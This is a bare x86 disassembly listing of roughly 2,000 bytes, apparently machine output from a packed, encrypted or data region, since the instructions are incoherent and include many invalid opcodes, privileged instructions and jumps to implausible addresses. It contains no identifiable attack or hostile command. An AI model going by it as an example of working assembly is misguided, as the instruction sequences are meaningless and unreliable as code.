  417d5b:	cmp    al,ah
  417d5d:	xchg   BYTE PTR [esi+0x3c079eb6],cl
  417d63:	in     al,0xd4
  417d65:	mov    eax,ds:0x5cef00a4
  417d6a:	rcl    BYTE PTR [esi],0x8f
  417d6d:	cmc    
  417d6e:	push   ss
  417d6f:	fcom   st(7)
  417d71:	pop    esp
  417d72:	sub    DWORD PTR [esi-0x689d3f69],esp
  417d78:	sbb    DWORD PTR [eax-0x593d710],ebp
  417d7e:	cwde   
  417d7f:	(bad)  [ebx+0x6e]
  417d82:	popa   
  417d83:	test   eax,0xc835d5b1
  417d88:	setl   BYTE PTR [ecx+0x63e4107a]
  417d8f:	or     eax,0xa67da3d8
  417d94:	xchg   esp,eax
  417d95:	fcomp  QWORD PTR [eax+0x74a0c9e6]
  417d9b:	retf   
  417d9c:	inc    edi
  417d9d:	adc    ah,ah
  417d9f:	aaa    
  417da0:	and    eax,0x8fd59c76
  417da5:	std    
  417da6:	mov    bl,0xda
  417da8:	jmp    0x822b440b
  417dad:	inc    esp
  417dae:	ins    DWORD PTR es:[edi],dx
  417daf:	jb     0x417d3b
  417db1:	and    cl,al
  417db3:	mov    edx,DWORD PTR ds:0x7b5a0778
  417db9:	or     al,0x5e
  417dbb:	mov    ?,WORD PTR [ebx-0x36]
  417dbe:	in     eax,0x5b
  417dc0:	pop    esp
  417dc1:	(bad)  
  417dc2:	stos   DWORD PTR es:[edi],eax
  417dc3:	shr    DWORD PTR [edx],1
  417dc5:	sbb    edx,DWORD PTR [esp+eiz*4+0x1]
  417dc9:	cwde   
  417dca:	(bad)  
  417dcb:	pop    esp
  417dcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dcd:	hlt    
  417dce:	mov    dl,0xe4
  417dd0:	sbb    eax,0x8d05900f
  417dd5:	sbb    eax,0x74c61231
  417dda:	loop   0x417e33
  417ddc:	bound  ecx,QWORD PTR [edx+0x20436379]
  417de2:	add    al,al
  417de4:	adc    BYTE PTR [ecx-0x7f3331c5],cl
  417dea:	out    0x3d,eax
  417dec:	mov    al,0x5e
  417dee:	cwde   
  417def:	jbe    0x417de7
  417df1:	push   cx
  417df3:	and    al,0x55
  417df5:	in     eax,0x42
  417df7:	les    edx,FWORD PTR [edi-0x5bab90f9]
  417dfd:	nop
  417dfe:	inc    edi
  417dff:	stos   DWORD PTR es:[edi],eax
  417e00:	cmc    
  417e01:	sbb    cl,bl
  417e03:	adc    esi,ebp
  417e05:	jle    0x417db5
  417e07:	dec    ebx
  417e08:	pop    eax
  417e09:	pop    ss
  417e0a:	aam    0x61
  417e0c:	repnz (bad) 
  417e0e:	xchg   edx,eax
  417e0f:	ss lock mov esp,0x17f9724
  417e16:	dec    esp
  417e17:	test   BYTE PTR [ecx+0xe],dh
  417e1a:	lock mov edx,0x4c59ef99
  417e20:	lds    eax,FWORD PTR [edi+0x7c83f72b]
  417e26:	rcl    DWORD PTR [edx],1
  417e28:	lock xor BYTE PTR [ecx+0x53126f9d],al
  417e2f:	les    esp,FWORD PTR [ebp-0x49a92236]
  417e35:	or     bh,BYTE PTR ds:0x6d7a9dde
  417e3b:	pop    edx
  417e3c:	dec    ecx
  417e3d:	pushf  
  417e3e:	call   0xbdc98ea7
  417e43:	mov    es,WORD PTR [edi-0x53bd892d]
  417e49:	fst    QWORD PTR ss:[esi-0x356546e5]
  417e50:	and    esi,DWORD PTR [edx+0x3a]
  417e53:	mov    eax,DWORD PTR [edx]
  417e55:	retf   
  417e56:	mov    ds:0x79f6a3c6,al
  417e5b:	xlat   BYTE PTR ds:[ebx]
  417e5c:	and    BYTE PTR gs:[esi],cl
  417e5f:	pop    esi
  417e60:	std    
  417e61:	jno    0x417e60
  417e63:	inc    esp
  417e64:	ins    DWORD PTR es:[edi],dx
  417e65:	or     al,0x8
  417e67:	push   es
  417e68:	out    dx,al
  417e69:	stos   BYTE PTR es:[edi],al
  417e6a:	or     ebx,ebp
  417e6c:	out    0x95,al
  417e6e:	pop    es
  417e6f:	inc    edi
  417e70:	stos   BYTE PTR es:[edi],al
  417e71:	das    
  417e72:	dec    edi
  417e73:	cmp    dl,BYTE PTR [ebx-0x139c4a03]
  417e79:	sbb    eax,0x72596f1f
  417e7e:	iret   
  417e7f:	shr    DWORD PTR [edi],0x4
  417e82:	and    eax,0x66712ca6
  417e87:	lods   eax,DWORD PTR ds:[esi]
  417e88:	jnp    0x417e51
  417e8a:	outs   dx,BYTE PTR ds:[esi]
  417e8b:	jnp    0x417e18
  417e8d:	add    ah,BYTE PTR [esp]
  417e90:	or     eax,0x5915ef89
  417e95:	sub    eax,0xb125fe4c
  417e9a:	pop    ebp
  417e9b:	or     DWORD PTR [eax+0x1a],ebx
  417e9e:	call   0xe918:0xeea6ec93
  417ea5:	nop
  417ea6:	mov    al,0x75
  417ea8:	mov    ecx,eax
  417eaa:	mov    ecx,0x9fd0279c
  417eaf:	in     al,dx
  417eb0:	add    al,BYTE PTR [edx-0x23b4a0e1]
  417eb6:	add    eax,0xcb271caf
  417ebb:	ja     0x417edb
  417ebd:	xchg   dl,bh
  417ebf:	rcl    BYTE PTR [ebp+0x1068d402],0x17
  417ec6:	mov    al,0x55
  417ec8:	ins    BYTE PTR es:[edi],dx
  417ec9:	push   0xaacffe57
  417ece:	mov    esp,DWORD PTR [ecx]
  417ed0:	lock sbb eax,0x731273e6
  417ed6:	push   0xffffff9e
  417ed8:	xchg   ebp,eax
  417ed9:	sub    bh,bh
  417edb:	popf   
  417edc:	xlat   BYTE PTR ds:[ebx]
  417edd:	pop    edi
  417ede:	das    
  417edf:	mov    cl,0xd6
  417ee1:	fstp   TBYTE PTR [ebp-0x702d9fe]
  417ee7:	(bad)  
  417ee8:	xor    eax,0x31cd871e
  417eed:	cmp    eax,0x6ecd5468
  417ef2:	leave  
  417ef3:	sbb    eax,0xae685f7f
  417ef8:	mov    ebp,0x69b58c55
  417efd:	bound  ebp,QWORD PTR [edx-0x34]
  417f00:	pop    esp
  417f01:	pop    ebp
  417f02:	ss ss add al,0x8e
  417f06:	sbb    DWORD PTR [edx],0x5c
  417f09:	dec    edx
  417f0a:	shl    DWORD PTR [esi-0x7c6100d2],0xf1
  417f11:	and    BYTE PTR [edi],0xfb
  417f14:	stc    
  417f15:	mov    edi,0xe0fa97b8
  417f1a:	mov    cl,0xf8
  417f1c:	mov    DWORD PTR [edi],edx
  417f1e:	jle    0x417efc
  417f20:	pushf  
  417f21:	(bad)  
  417f22:	in     eax,dx
  417f23:	sub    al,0x7
  417f25:	scas   al,BYTE PTR es:[edi]
  417f26:	cmp    ch,BYTE PTR [esi-0x74bb32a9]
  417f2c:	mov    ch,BYTE PTR ds:0x23ac4e30
  417f32:	das    
  417f33:	(bad)  
  417f34:	push   edi
  417f35:	jg     0x417ed3
  417f37:	mov    bh,0xc4
  417f39:	inc    ebx
  417f3a:	push   0xf76c3d38
  417f3f:	fnstenv [ecx+0x17]
  417f42:	lahf   
  417f43:	shr    al,0x43
  417f46:	or     dh,bh
  417f48:	repnz shr DWORD PTR [ecx+0xf029110],0xfa
  417f50:	pop    eax
  417f51:	aad    0x4a
  417f53:	and    bh,BYTE PTR [ebx]
  417f55:	push   edi
  417f56:	fdiv   DWORD PTR [ebx-0xddd901f]
  417f5c:	sbb    DWORD PTR [ecx+0x2ca09474],edi
  417f62:	out    0xfd,eax
  417f64:	jmp    0x417f88
  417f66:	jnp    0x417f39
  417f68:	inc    edi
  417f69:	lds    edi,FWORD PTR [esi-0xf9840ce]
  417f6f:	inc    eax
  417f70:	mov    dl,BYTE PTR [eax+0x16ad752a]
  417f76:	xchg   ecx,eax
  417f77:	daa    
  417f78:	cs sub al,dh
  417f7b:	aas    
  417f7c:	mov    dl,0x96
  417f7e:	adc    eax,DWORD PTR [edi-0x1ed0e3db]
  417f84:	dec    edi
  417f85:	mov    al,ds:0x8a3c566e
  417f8a:	retf   
  417f8b:	mov    esp,0x16f1a64b
  417f90:	adc    eax,0x27f004
  417f95:	(bad)  
  417f96:	jmp    0x417f70
  417f98:	xor    ecx,edx
  417f9a:	push   ebx
  417f9b:	inc    edx
  417f9c:	xor    eax,0xf9d86a1
  417fa1:	(bad)  
  417fa2:	sbb    edx,DWORD PTR [ecx-0x60]
  417fa5:	test   eax,0xf16300ea
  417faa:	mov    edi,0xf60f5d3b
  417faf:	pop    esp
  417fb0:	sti    
  417fb1:	(bad)  
  417fb2:	cmp    dl,BYTE PTR [ebx]
  417fb4:	repnz sbb BYTE PTR [esi-0x32],dl
  417fb8:	lidtd  [eax]
  417fbb:	sub    eax,0x435ca97e
  417fc0:	das    
  417fc1:	cs mov esi,0xfb37a69c
  417fc7:	push   ds
  417fc8:	jecxz  0x417f6c
  417fca:	dec    ecx
  417fcb:	aas    
  417fcc:	test   DWORD PTR [edx-0xb],esp
  417fcf:	mov    dh,0xb
  417fd1:	pop    edi
  417fd2:	push   esi
  417fd3:	test   al,0xa4
  417fd5:	or     eax,0xdec8f5b
  417fda:	and    al,0x68
  417fdc:	and    al,0xe5
  417fde:	xchg   edx,eax
  417fdf:	pop    DWORD PTR [ebx+0x3d9e7272]
  417fe5:	and    esp,esp
  417fe7:	ds sbb eax,0x5c5a927a
  417fed:	mov    ds:0x5198b4cb,eax
  417ff2:	daa    
  417ff3:	inc    esp
  417ff4:	push   eax
  417ff5:	or     DWORD PTR ds:0xe43b1560,eax
  417ffb:	jp     0x41802e
  417ffd:	mov    ch,0x57
  417fff:	loopne 0x418026
  418001:	pop    ss
  418002:	mov    bl,0xfb
  418004:	sub    al,0xeb
  418006:	dec    edx
  418007:	sub    BYTE PTR [ebp+0x135b5da1],ch
  41800d:	sahf   
  41800e:	in     eax,dx
  41800f:	lods   al,BYTE PTR ds:[esi]
  418010:	mov    al,ds:0x68a054e3
  418015:	jb     0x417fd6
  418017:	mov    eax,0xc9aff0a6
  41801c:	push   esp
  41801e:	mov    eax,ds:0x411e1ea2
  418023:	clc    
  418024:	pusha  
  418025:	xchg   BYTE PTR [eax-0x6c2c9d21],cl
  41802b:	pop    eax
  41802c:	and    ch,BYTE PTR [ecx]
  41802e:	jle    0x418074
  418030:	mov    esi,0x68cfe6d0
  418035:	xchg   esp,eax
  418036:	jb     0x418070
  418038:	loop   0x41803f
  41803a:	inc    edi
  41803b:	leave  
  41803c:	add    cl,BYTE PTR [edi]
  41803e:	xchg   esp,eax
  41803f:	xlat   BYTE PTR ds:[ebx]
  418040:	les    edx,FWORD PTR [edi-0x37]
  418043:	jmp    0x5949ff57
  418048:	xor    ecx,DWORD PTR [ebp+0x27]
  41804b:	pop    esp
  41804c:	pop    eax
  41804d:	stos   BYTE PTR es:[edi],al
  41804e:	ins    DWORD PTR es:[edi],dx
  41804f:	scas   eax,DWORD PTR es:[edi]
  418050:	(bad)  
  418051:	cmp    dl,BYTE PTR [ebp+0x2b]
  418054:	into   
  418055:	mov    ebx,0x5da5fff7
  41805a:	(bad)  
  41805c:	fcom   DWORD PTR [eax+0x57]
  41805f:	sub    eax,0xe4ddc7b
  418064:	pop    esp
  418065:	sub    cl,dh
  418067:	sbb    BYTE PTR [edx],bl
  418069:	ds popa 
  41806b:	fcom   DWORD PTR [ebx+0x71]
  41806e:	out    0x3e,eax
  418070:	daa    
  418071:	push   0x92895f1b
  418076:	fsub   st,st(7)
  418078:	aad    0x71
  41807a:	mov    dl,0x45
  41807c:	mov    eax,0xda917a7c
  418081:	mov    cl,0xfd
  418083:	inc    ecx
  418084:	inc    esp
  418085:	xlat   BYTE PTR ds:[ebx]
  418086:	jmp    0x4180da
  418088:	jecxz  0x4180b2
  41808a:	sti    
  41808b:	(bad)  
  41808c:	ror    BYTE PTR [bp+di+0x6e],0xe
  418091:	jl     0x4180ea
  418093:	shr    BYTE PTR [edi-0x349e5257],cl
  418099:	mov    esi,0x6a4764af
  41809e:	orps   xmm6,XMMWORD PTR [eax+0x3c]
  4180a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180a3:	inc    ebp
  4180a4:	mov    dh,0x3
  4180a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a7:	popa   
  4180a8:	retf   0xc89b
  4180ab:	lahf   
  4180ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180ad:	adc    DWORD PTR [ebp-0x49a8e9ce],edx
  4180b3:	in     al,dx
  4180b4:	sub    al,0x18
  4180b6:	dec    eax
  4180b7:	sbb    bh,BYTE PTR [edx-0x118a7933]
  4180bd:	(bad)  
  4180bf:	pop    ss
  4180c0:	dec    edi
  4180c1:	inc    edx
  4180c2:	call   0xc2:0x1188d47c
  4180c9:	cmp    DWORD PTR ds:0x11e5d409,0x74
  4180d0:	shr    bh,1
  4180d2:	fnsave [bp+si+0x33d7]
  4180d7:	cli    
  4180d8:	xchg   BYTE PTR [ebx+0x57],bl
  4180db:	out    0x7c,eax
  4180dd:	jl     0x418139
  4180df:	es sbb eax,0xb4f6689d
  4180e5:	or     ebx,DWORD PTR [eax]
  4180e7:	lock sbb al,0xa3
  4180ea:	jmp    0xfafb49b2
  4180ef:	imul   ebx,DWORD PTR [esi],0x4401fc9f
  4180f5:	sahf   
  4180f6:	jp     0x41810b
  4180f8:	idiv   BYTE PTR [edi-0x6c]
  4180fb:	imul   ebx,eax,0x2b
  4180fe:	push   ecx
  4180ff:	(bad)  
  418100:	sub    BYTE PTR cs:[eax],dl
  418103:	hlt    
  418104:	adc    DWORD PTR [ebx-0x48],eax
  418107:	and    esp,DWORD PTR fs:[ebx]
  41810a:	xchg   ebx,eax
  41810b:	imul   ecx,DWORD PTR [edx+esi*8],0x1
  41810f:	or     BYTE PTR [edx],al
  418111:	mov    ebp,0xf35ee59b
  418116:	call   0xad5b6241
  41811b:	push   es
  41811c:	in     al,dx
  41811d:	or     al,0xb5
  41811f:	test   eax,0x4294dcc1
  418124:	and    esp,DWORD PTR fs:[edi]
  418127:	jecxz  0x418145
  418129:	and    al,0xee
  41812b:	push   0x0
  41812d:	fbld   TBYTE PTR [esi+0x62]
  418130:	sti    
  418131:	push   ds
  418132:	jbe    0x41812a
  418134:	shrd   DWORD PTR [ebx+0xbf1618f],esp,cl
  41813b:	outs   dx,BYTE PTR ds:[esi]
  41813c:	sbb    edx,DWORD PTR [esi+0x35]
  41813f:	mov    eax,ds:0x51d9ce12
  418144:	mov    eax,ds:0xbcda970b
  418149:	sbb    ebp,DWORD PTR [ebx-0x64ab1514]
  41814f:	dec    esp
  418150:	or     eax,0x20a4cfb
  418155:	jecxz  0x4180db
  418157:	jg     0x4181d6
  418159:	pop    es
  41815a:	ret    0xe588
  41815d:	ins    DWORD PTR es:[edi],dx
  41815e:	adc    BYTE PTR [edx-0x686b3e1b],cl
  418164:	mov    ah,0x97
  418166:	push   ebx
  418167:	pop    ecx
  418168:	std    
  418169:	sub    bh,bh
  41816b:	fldcw  WORD PTR [ebp+0x327cd323]
  418171:	jne    0x41817d
  418173:	inc    esp
  418174:	in     eax,0x76
  418176:	mov    ch,0x34
  418178:	pusha  
  418179:	out    0xcb,al
  41817b:	mov    ebp,0x19f77173
  418180:	mov    ebx,0xd6e7b88f
  418185:	xchg   edx,eax
  418186:	dec    ebx
  418187:	aaa    
  418188:	mov    al,ds:0x87d5945c
  41818d:	mov    WORD PTR [edi+0x49],cs
  418190:	mov    esi,0xbf2f3622
  418195:	sub    BYTE PTR [eax],dh
  418197:	and    al,0x93
  418199:	fidiv  WORD PTR [edi+0x2a1df8de]
  41819f:	pop    ds
  4181a0:	gs inc ebx
  4181a2:	outs   dx,DWORD PTR ds:[esi]
  4181a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181a4:	pop    ecx
  4181a5:	lods   eax,DWORD PTR ds:[esi]
  4181a6:	(bad)  
  4181a7:	mov    esi,0xbe2228a8
  4181ac:	jae    0x418196
  4181ae:	in     eax,dx
  4181af:	xchg   esp,eax
  4181b0:	les    eax,FWORD PTR [ecx+ecx*4+0x73e6707b]
  4181b7:	cmp    BYTE PTR [ebp+0x69],dh
  4181ba:	sbb    dl,BYTE PTR [ebx-0x35]
  4181bd:	push   esp
  4181be:	stc    
  4181bf:	les    eax,FWORD PTR [edx]
  4181c1:	mov    WORD PTR [edi+0x72],?
  4181c4:	jge    0x418199
  4181c6:	clc    
  4181c7:	ret    0x7618
  4181ca:	sahf   
  4181cb:	adc    eax,0x5838c104
  4181d0:	or     al,0xbf
  4181d2:	jnp    0x41817a
  4181d4:	xlat   BYTE PTR ds:[ebx]
  4181d5:	sub    esi,DWORD PTR [ebx-0x36]
  4181d8:	loope  0x41821e
  4181da:	lods   eax,DWORD PTR ds:[esi]
  4181db:	push   esi
  4181dc:	push   0x70e700bc
  4181e1:	rol    edx,0x88
  4181e4:	sub    dl,0x64
  4181e7:	jmp    0x41816b
  4181e9:	repz mov eax,0xf97827e8
  4181ef:	daa    
  4181f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181f1:	sub    DWORD PTR [edi-0x58],esi
  4181f4:	inc    esp
  4181f5:	xchg   edx,eax
  4181f6:	xor    BYTE PTR [ebx],ch
  4181f8:	cmc    
  4181f9:	cmp    BYTE PTR [esi-0x2fbb0f7],ah
  4181ff:	jbe    0x4181f1
  418201:	xor    BYTE PTR [esi],ch
  418203:	push   esp
  418204:	das    
  418205:	aad    0x16
  418207:	jb     0x41823d
  418209:	xor    BYTE PTR [esi],ch
  41820b:	adc    ecx,edx
  41820d:	pop    esp
  41820e:	fmul   QWORD PTR [esi-0x3c]
  418211:	sbb    BYTE PTR ds:0xf08a055c,0xb3
  418218:	push   ebx
  418219:	add    al,0xf7
  41821b:	jmp    0xe850:0x4718e04d
  418222:	outs   dx,DWORD PTR ds:[esi]
  418223:	arpl   bx,si
  418225:	cmp    ebx,DWORD PTR [ebx+ebx*8+0x60]
  418229:	or     al,0x1
  41822b:	cmp    DWORD PTR [eax+eiz*1],esi
  41822e:	sbb    esp,ecx
  418230:	lds    esp,FWORD PTR ds:0x13c5cd0e
  418236:	mov    esi,0xb7c8594
  41823b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41823c:	mov    WORD PTR [edi-0x40],gs
  41823f:	mov    al,ds:0x5257c281
  418244:	xchg   ecx,eax
  418245:	fdivp  st(2),st
  418247:	(bad)  
  418248:	hlt    
  418249:	in     eax,0xc5
  41824b:	out    dx,al
  41824c:	push   0xdf618717
  418251:	push   cs
  418252:	sbb    al,0xa
  418254:	iret   
  418255:	cmp    eax,0xf1d1c0f3
  41825a:	jmp    0x223e862b
  41825f:	lods   eax,DWORD PTR ds:[esi]
  418260:	test   eax,0x6e163426
  418265:	jg     0x418225
  418267:	add    BYTE PTR [ebx+0x61],dh
  41826a:	cmp    esi,DWORD PTR [edx+edx*2]
  41826d:	cwde   
  41826e:	std    
  41826f:	inc    esp
  418270:	cwde   
  418271:	test   al,0x2b
  418273:	mov    eax,ds:0x49a9b57b
  418278:	(bad)  
  418279:	shl    DWORD PTR [ecx],1
  41827b:	cwde   
  41827c:	adc    eax,0x9e3ee1ee
  418281:	sti    
  418282:	inc    esi
  418283:	mov    ebx,0xc0ed41ca
  418288:	loope  0x4182fb
  41828a:	mov    ah,BYTE PTR [esi-0x17]
  41828d:	cld    
  41828e:	aam    0xfc
  418290:	(bad)  
  418291:	push   ds
  418292:	clc    
  418293:	mov    esp,0xf7c55d2
  418298:	std    
  418299:	jno    0x418265
  41829b:	(bad)
  41829f:	je     0x4182d3
  4182a1:	ins    BYTE PTR es:[edi],dx
  4182a2:	cmp    al,0x17
  4182a5:	rol    edi,cl
  4182a7:	sbb    ebx,DWORD PTR [esi-0x2b291a09]
  4182ad:	fisubr WORD PTR [ebx]
  4182af:	dec    ebx
  4182b0:	lock add bl,BYTE PTR ds:0x8b8f2b0
  4182b7:	sbb    eax,0xcea6c52b
  4182bc:	imul   edi,DWORD PTR [edi+0x63],0x39ef1f23
  4182c3:	outs   dx,DWORD PTR ds:[esi]
  4182c4:	stos   BYTE PTR es:[edi],al
  4182c5:	test   DWORD PTR [eax+0x766fdb5c],0xfef6ebc4
  4182cf:	pusha  
  4182d0:	sahf   
  4182d1:	inc    ebx
  4182d2:	dec    edi
  4182d3:	mov    esi,0x754ebc2f
  4182d8:	or     al,0x2
  4182da:	push   0xe864b52
  4182df:	pop    ds
  4182e0:	xor    al,0x51
  4182e2:	cwde   
  4182e3:	push   0xffffff84
  4182e5:	sub    ebx,eax
  4182e7:	push   edx
  4182e8:	cwde   
  4182e9:	aas    
  4182ea:	mov    eax,0x31bc9145
  4182ef:	addr16 ja 0x418304
  4182f2:	cmp    ebp,eax
  4182f4:	loop   0x418364
  4182f6:	push   edx
  4182f7:	into   
  4182f8:	test   BYTE PTR [esi+0x3c46c104],bl
  4182fe:	or     eax,0x4efc425b
  418303:	sub    BYTE PTR [ebx],ah
  418305:	adc    esi,esi
  418307:	xchg   edx,eax
  418308:	pop    ebx
  418309:	xchg   edx,eax
  41830a:	adc    al,0x16
  41830c:	mov    edi,0x2273f3e7
  418311:	mov    es,edi
  418313:	push   esi
  418314:	dec    edi
  418315:	xor    bl,bh
  418317:	(bad)  
  418318:	push   ss
  418319:	clc    
  41831a:	out    dx,al
  41831b:	dec    ebx
  41831c:	sbb    ecx,0xa8aaf1a9
  418322:	jl     0x41836a
  418324:	xor    DWORD PTR [eax],esp
  418326:	pop    ebp
  418327:	add    eax,0xace4f13e
  41832c:	iret   
  41832d:	xor    BYTE PTR [esi+0x3e],0xc
  418331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418332:	mov    bl,0xaa
  418334:	mov    eax,ds:0x8f44046e
  418339:	adc    ah,BYTE PTR [ebx+0x37413684]
  41833f:	inc    edx
  418340:	fst    DWORD PTR [edx]
  418342:	stos   BYTE PTR es:[edi],al
  418343:	jl     0x418361
  418345:	and    ch,BYTE PTR [edi+0x7a]
  418348:	or     edi,DWORD PTR ds:0x7e0e7e3a
  41834e:	pop    ecx
  41834f:	fnsave [ecx]
  418351:	push   edi
  418352:	imul   esi,edi,0xa544a243
  418358:	inc    ecx
  418359:	int    0xda
  41835b:	nop
  41835c:	ret    0x303c
  41835f:	pushf  
  418360:	jmp    0xdd7859f
  418365:	xor    al,0x8e
  418367:	or     DWORD PTR fs:[edx+ebx*2+0x6cd1ce1e],esi
  41836f:	dec    esi
  418370:	hlt    
  418371:	out    0x5d,al
  418373:	fxch   st(2)
  418375:	icebp  
  418376:	xor    ebx,DWORD PTR [esi]
  418378:	dec    ecx
  418379:	sbb    ecx,ecx
  41837b:	imul   esi,ecx,0xffffff98
  41837e:	out    0xe,eax
  418380:	mov    ch,0x3e
  418382:	jmp    0x8e9c:0x9640a8ea
  418389:	xchg   edi,eax
  41838a:	sar    DWORD PTR [ebx+ebx*4-0x385fb1bf],1
  418391:	sbb    esp,DWORD PTR [ebp-0x1de97990]
  418397:	adc    DWORD PTR [eax-0x49],esp
  41839a:	jmp    0x4bb219f1
  41839f:	mov    cl,al
  4183a1:	xchg   DWORD PTR [ebx+ebx*1-0x3a9ca8d1],ecx
  4183a8:	jo     0x4183f0
  4183aa:	inc    esp
  4183ab:	jp     0x418356
  4183ad:	xor    eax,0xc3017814
  4183b2:	jae    0x41841e
  4183b4:	jl     0x4183ae
  4183b6:	xchg   ecx,eax
  4183b7:	cmp    BYTE PTR [ecx-0x5e],dl
  4183ba:	ror    DWORD PTR [esi],cl
  4183bc:	call   0xf52b:0x7bcd9106
  4183c3:	add    al,0xbb
  4183c5:	ret    0xed78
  4183c8:	lds    eax,FWORD PTR [esi-0x6ef98867]
  4183ce:	popf   
  4183cf:	imul   eax,ebx,0x3583f2d2
  4183d5:	cmc    
  4183d6:	mov    edi,0x538df5d4
  4183db:	pop    ss
  4183dc:	in     eax,dx
  4183dd:	in     eax,dx
  4183de:	cld    
  4183df:	cwde   
  4183e0:	enter  0x59c0,0x92
  4183e4:	fst    QWORD PTR [esi+0x10]
  4183e7:	jne    0x4183ce
  4183e9:	xor    cl,BYTE PTR [ecx]
  4183eb:	iret   
  4183ec:	push   0x49
  4183ee:	js     0x4183d8
  4183f0:	sub    edx,DWORD PTR [edi]
  4183f2:	mov    dl,0xf3
  4183f4:	xchg   BYTE PTR [esi-0x6e],al
  4183f7:	pusha  
  4183f8:	jl     0x418390
  4183fa:	sub    al,0x8f
  4183fc:	out    dx,al
  4183fd:	enter  0x3c58,0xc6
  418401:	ror    DWORD PTR [esi+0x22],cl
  418404:	jmp    0x408e2032
  418409:	sub    cl,BYTE PTR [ebp-0x4e]
  41840c:	cwde   
  41840d:	cmp    eax,0xcdf663
  418412:	xchg   esi,eax
  418413:	out    0x5a,eax
  418415:	push   ds
  418416:	xchg   esp,eax
  418417:	adc    eax,0x93e9a24a
  41841c:	ror    DWORD PTR [esi+0x359889fa],0x1d
  418423:	mov    eax,ds:0xdfec76b0
  418428:	push   ds
  418429:	and    edx,ebp
  41842b:	or     esp,DWORD PTR [ecx+0x5a]
  41842e:	out    dx,eax
  41842f:	jns    0x418480
  418431:	jns    0x4183ed
  418433:	addr16 int 0xa0
  418436:	and    DWORD PTR [ecx],ebx
  418438:	inc    esi
  418439:	xchg   bl,dh
  41843b:	test   BYTE PTR [eax],bl
  41843d:	arpl   di,sp
  41843f:	adc    DWORD PTR [ebp+0x4a],eax
  418442:	aam    0x3d
  418444:	xchg   esp,eax
  418445:	push   ecx
  418446:	out    0xa9,al
  418448:	jns    0x4183ed
  41844a:	scas   eax,DWORD PTR es:[edi]
  41844b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844c:	mov    edx,0x7ef4c662
  418451:	retf   
  418452:	mov    ds:0x673813cc,eax
  418457:	popf   
  418458:	jno    0x41840a
  41845a:	mov    BYTE PTR [eax-0x1531a287],dh
  418460:	and    dl,bl
  418462:	cli    
  418463:	std    
  418464:	cld    
  418465:	aad    0xd0
  418467:	sbb    edi,esi
  418469:	sbb    eax,0x60a7a1ed
  41846e:	jne    0x418450
  418470:	sub    ah,BYTE PTR [edx+0x4c081e5]
  418476:	test   eax,0xcd52aef3
  41847b:	xchg   BYTE PTR [ebx],al
  41847d:	sub    BYTE PTR [ebx-0x1],0x23
  418481:	xchg   ebx,eax
  418482:	mov    bh,0xc2
  418484:	mov    cl,0xae
  418486:	push   esp
  418487:	(bad)  
  41848a:	or     eax,0x65024ff5
  41848f:	cli    
  418490:	ds dec ebx
  418492:	lahf   
  418493:	mov    ebx,0x3bca6e50
  418498:	jo     0x41842f
  41849a:	mov    BYTE PTR [edi-0x8],cl
  41849d:	mov    ah,0xf8
  41849f:	ret    
  4184a0:	add    bl,dl
  4184a2:	mov    eax,0xc468a8b7
  4184a7:	cmp    BYTE PTR [esp+edx*8+0x1b3b420d],ah
  4184ae:	std    
  4184af:	cmp    DWORD PTR [ecx+0x7e],0xc13e42ef
  4184b6:	adc    dl,BYTE PTR ds:0x222994eb
  4184bc:	inc    esi
  4184bd:	or     edx,DWORD PTR [esi]
  4184bf:	out    dx,eax
  4184c0:	inc    edi
  4184c1:	push   es
  4184c2:	xor    BYTE PTR [ebx+0x1ea8f31],dh
  4184c8:	sbb    al,BYTE PTR [esi]
  4184ca:	inc    ebp
  4184cb:	push   ebp
  4184cc:	lahf   
  4184cd:	test   DWORD PTR [ecx],edx
  4184cf:	loopne 0x41848a
  4184d1:	in     al,dx
  4184d2:	dec    eax
  4184d3:	push   eax
  4184d4:	stc    
  4184d5:	jecxz  0x418482
  4184d7:	xor    bh,dh
  4184d9:	push   esp
  4184da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184db:	mov    bh,0xe6
  4184dd:	jmp    0x418471
  4184df:	fdiv   DWORD PTR ds:0xeecdbc8c
  4184e5:	mov    edx,0x384ff35b
  4184ea:	ss lock jno 0x4184e2
  4184ee:	repnz es mov al,0xd
  4184f2:	outs   dx,BYTE PTR ds:[esi]
  4184f3:	push   ebx
  4184f4:	push   0x30879588
  4184f9:	jge    0x41851b
  4184fb:	jmp    FWORD PTR [edi-0x56eb6959]
  418501:	push   DWORD PTR [edi]
  418503:	out    dx,al
  418504:	addr16 mov eax,0x5822def9
  41850a:	ret    
  41850b:	jge    0x418501
  41850d:	or     BYTE PTR [edi-0x2a4c53c7],0x1d
  418514:	rol    DWORD PTR [ecx-0x44a70bd4],cl
  41851a:	fld    TBYTE PTR [ebx]
  41851c:	sub    cl,BYTE PTR [esi]
  41851e:	xchg   esi,eax
  41851f:	in     al,dx
  418520:	fisttp DWORD PTR [ebp+0x44399f92]
  418526:	push   0xa0f6a849
  41852b:	(bad)  
  41852d:	cmp    ebx,edx
  41852f:	fsub   st,st(4)
  418531:	xor    eax,0xc6811035
  418536:	xchg   ebx,eax
  418537:	cs out dx,eax
  418539:	dec    esp
  41853a:	pop    ebx
  41853b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41853c:	fcmovnbe st,st(2)
  41853e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41853f:	stos   BYTE PTR es:[edi],al
  418540:	mov    ebx,0xde409e89
  418545:	icebp  
  418546:	xor    ebp,esi
  418548:	fmul   DWORD PTR [esi-0xd]
  41854b:	mov    al,ds:0xe76ea00e
  418550:	xor    dl,ch
  418552:	shr    DWORD PTR [esi],0xcc
  418555:	sub    ecx,DWORD PTR [eax+0x5c]
  418558:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41855a:	bound  esp,QWORD PTR [ecx+0x4f]
  41855d:	cld    
  41855e:	pop    edx
  41855f:	daa    
  418560:	xchg   ecx,eax
  418561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418562:	pop    esp
  418563:	pop    esi
  418564:	in     al,dx
